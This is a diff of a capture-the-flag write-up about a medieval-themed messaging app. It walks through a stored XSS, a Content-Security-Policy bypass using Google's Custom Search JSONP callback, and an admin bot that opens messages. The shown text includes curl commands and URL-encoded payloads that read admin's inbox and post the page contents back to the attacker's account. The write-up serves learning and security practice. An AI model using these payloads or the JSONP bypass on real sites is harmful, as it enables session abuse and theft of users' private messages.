@@ -17,10 +17,11 @@ tags:
 | **Author**     | chmakorkrichh                                              |
 
 This challenge is dressed up as a medieval-themed messaging app — think knights, archivists, ravenmasters, the whole aesthetic — where users send "sealed letters" to each other. The fun part: there's an **admin bot** that automatically opens any letter sent to the `admin` user, like some overworked royal secretary who reads every piece of mail the second it lands. The flag itself is sitting in admin's inbox, sent by a user called `archivist`. So my job was basically: find a way to read mail that isn't addressed to me.
+
 ## 1. Poking Through the Source Code
 To be fully understand how we can get the flag, we need to review the source code first.
 
-I'm not a developer. No coding background, nothing. So for this part I leaned on AI to read through the code with me and point out anything that looked sketchy. Here's the folder structure we were working with:
+I'm not a developer. No coding background, nothing. So for this source code review part I leaned on AI to read through the code with me and point out anything that looked sketchy. Here's the folder structure we were working with:
 
 ```
 ├── app/
@@ -93,7 +94,7 @@ Two options came to mind:
 ```
 **Translation:** whatever HTML/JavaScript I stuff into a message content field gets rendered directly in the recipient's browser. In other words, I get to write on someone else's wall with my own marker. Classic Stored XSS.
 
-### Bug #2 — An Admin Bot That's a Little Too Curious 
+### Bug #2 - An Admin Bot That's a Little Too Curious 
 
 **File:** `app/controllers/messageController.js`:
 ```javascript
@@ -127,9 +128,9 @@ async function visitMessage(messageId) {
 }
 ```
 
-the moment I send something to `admin`, boom — a headless Firefox instance launches and logs in as admin for real, cookies and all. So any JavaScript I sneak into that message runs with admin's own session. It's like borrowing admin's hands to do my dirty work while they're not looking 
+the moment I send something to `admin`, boom! a headless Firefox instance launches and logs in as admin for real, cookies and all. So any JavaScript I sneak into that message runs with admin's own session. It's like borrowing admin's hands to do my dirty work while they're not looking 
 
-### Bug #3 — A CSP With a Google-Shaped Hole in It
+### Bug #3 - A CSP With a Google-Shaped Hole in It
 
 **Content-Security-Policy header:**
 ```
@@ -157,16 +158,16 @@ frame-ancestors 'none'
 |**Missing**|`base-uri`|You could inject a `<base>` tag (didn't need it here)|
 |**Missing**|`'unsafe-inline'` in script-src|No inline event handlers (`onclick`, `onerror`, etc.)|
 
-**Caught it — that `https://www.googleapis.com` entry is the golden ticket.** Google's Custom Search JSON API takes a `callback` parameter and reflects it right back as valid JavaScript. Basically Google was accidentally helping me smuggle a script past the CSP without even knowing it 
+**Caught it that `https://www.googleapis.com` entry is the golden ticket.** Google's Custom Search JSON API takes a `callback` parameter and reflects it right back as valid JavaScript. Basically Google was accidentally helping me smuggle a script past the CSP without even knowing it 
 
 ## 3. time to get my hand dirty
 
 ### overview of the web app
 this is how the web app looks like after i registered a user and login.
 ![](/assets/img/images/massagold-2.webp)
-### Step 1 — First, Just Break the HTML
-Before doing anything fancy, I wanted to confirm the HTML break-out actually works, so I sent this to myself:
-CURL method:
+### Step 1 - First, Just Break the HTML
+Before doing anything fancy, I wanted to confirm the HTML break-out actually works, so I sent to myself:
+CURL command:
 ```bash
 curl -X POST http://TARGET:PORT/messages \
   -b cookies.txt \
@@ -175,7 +176,7 @@ curl -X POST http://TARGET:PORT/messages \
 ```
 received a message from myself:
 ![](/assets/img/images/massagold-3.webp)
-Opened the message and yep, there it was:
+opened the message and yep, there it was:
 
 ```html
 <!-- Before injection -->
@@ -194,7 +195,7 @@ The `</pre>` closes the pre tag, `</div></section></main>` peels back the wrappi
 ![](/assets/img/images/massagold-6.webp)
 Above is after i injected a JSONP script.
 
-### Step 2 — Testing the Google JSONP Trick
+### Step 2 - Testing the Google JSONP Trick
 we can debug the script by sending a seal message to ourselves.
 
 Next I wanted to see if Google's Custom Search API would actually reflect my callback:
@@ -214,9 +215,9 @@ alert(1)({
 });
 ```
 
-**This is the funny part:** Google literally tells you the callback name is invalid, and then reflects it anyway as `alert(1)({...error...})` — perfectly valid JavaScript. So when loaded as a `<script src>`, the browser just runs `alert(1)` with the error object as its argument. Thanks for the assist, Google.
+This is the funny part Google literally tells you the callback name is invalid, and then reflects it anyway as `alert(1)({...error...})` — perfectly valid JavaScript. So when loaded as a `<script src>`, the browser just runs `alert(1)` with the error object as its argument. Thanks for the assist, Google.
 
-### Step 3 — Actually Testing the CSP Bypass
+### Step 3 - Actually Testing the CSP Bypass
 
 Time for the real thing. I sent the simplest possible XSS payload to admin:
 ```bash
@@ -227,9 +228,9 @@ curl -X POST http://TARGET:PORT/messages \
 ```
 ![](/assets/img/images/massagold-7.webp)
 
-**Result:** the admin bot visits, the browser loads Google's script, and `alert('chmakorkrich is here')` fires right there in admin's own context. The `<script src>` from `www.googleapis.com` just walks straight past CSP like it's got a VIP pass.
+the admin bot visits, the browser loads Google's script, and `alert('chmakorkrich is here')` fires right there in admin's own context. The `<script src>` from `www.googleapis.com` just walks straight past CSP like it's got a VIP pass.
 
-### Step 4 — Making Sure Same-Origin Fetch Works
+### Step 4 - Making Sure Same-Origin Fetch Works
 
 Now that I had a door in, I wanted to check whether `fetch()` to the app's own endpoints would actually work (since `connect-src 'self'` allows it):
 ```bash
@@ -248,7 +249,7 @@ As you can see, i got a message from myself, which triggered by the admin bot.
 
 **Result:** a message shows up in my own inbox with the content `PROOF`. Same-origin POST — confirmed working. At this point all the pieces were on the table, I just needed to assemble them into the actual flag-stealing payload.
 
-### Step 5 — Falling Into (and Climbing Out of) the Async Chain Trap
+### Step 5 - Falling Into (and Climbing Out of) the Async Chain Trap
 My first attempts using `.then()` chains looked like total failures. Kind of demoralizing, honestly. But after digging into it a bit more, here's what was actually going on:
 
 **How Google wraps your callback:**
@@ -277,13 +278,10 @@ fetch('/messages/1').then(r=>r.text()).then(t=>...)({...error...});
 3. `({...error...})` tries calling that Promise → TypeError
 4. But the callbacks are already registered — they fire whenever the actual GET response comes back
 
-**What I learned:** the admin bot doesn't process everything at once — it works through a queue, one visit at a time, and each visit takes about 10-15 seconds. So if I fired off a bunch of payloads back to back, they'd just pile up in line. 
-
-Lesson learned: patience, and waiting 20-30 seconds between checking my inbox again (CTFs really do teach you patience, huh).
 
 ## 4. The Payloads That Actually Got the Job Done
 
-### Payload 1 — XSS Confirmation
+### Payload 1 - XSS Confirmation
 Proves the bot visits and script executes:
 
 **JavaScript:**
@@ -301,7 +299,7 @@ fetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParam
 </pre></div></section></main><script src="https://www.googleapis.com/customsearch/v1?callback=fetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParams%28%7Bto_username%3A%27YOUR_USER%27%2Ccontent%3A%27XSS_CONFIRMED%27%7D%29%7D%29&key=x&cx=x&q=x"></script>
 ```
 
-### Payload 2 — Dump Admin's Inbox
+### Payload 2 - Dump Admin's Inbox
 Fetches the inbox page and sends it back:
 
 **JavaScript:**
@@ -319,7 +317,7 @@ fetch('/').then(function(r){return r.text()}).then(function(t){
 fetch%28%27%2F%27%29.then%28function%28r%29%7Breturn%20r.text%28%29%7D%29.then%28function%28t%29%7Bfetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParams%28%7Bto_username%3A%27YOUR_USER%27%2Ccontent%3At.substring%280%2C500%29%7D%29%7D%29%7D%29
 ```
 
-### Payload 3 — Flag Exfiltration (Final)
+### Payload 3 - Flag Exfiltration (Final)
 Reads message #1 and sends the **full page HTML** back to you. the flag sits deep in the HTML structure (after nav, seal sections, letter-meta).
 
 **JavaScript:**
@@ -349,7 +347,7 @@ Open it, you will feel like it is a nested sealed scrolls.
 Get the flag by CTRL+U and scroll down.
 ![](/assets/img/images/massagold-12.webp)
 
-## 5. Quick Diagram — How the Whole Thing Actually Plays Out
+## 5. Quick Diagram - How the Whole Thing Actually Plays Out
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -416,18 +414,6 @@ Not sure this makes me a "real" hacker yet, but I definitely walked away underst
 |SQL injection|Everything's parameterized (`?` placeholders) — no luck there|
 |Path traversal|`express.static` sanitizes paths properly|
 
-### The CSP Bypass, In More Detail
-
-Google's Custom Search JSON API endpoint:
-```
-https://www.googleapis.com/customsearch/v1?callback=PAYLOAD&key=x&cx=x&q=x
-```
-
-- Accepts **literally any string** as the `callback` param, error message notwithstanding
-- Returns `PAYLOAD({...error...})` as `application/javascript`
-- The `// API callback` comment on line 1 is valid JS (just a comment)
-- `>` characters get escaped to `\u003e` (a valid JS Unicode escape)
-- Even error responses still get wrapped in the callback — **no API key required at all**
 
 
 Thanks for reading forks.
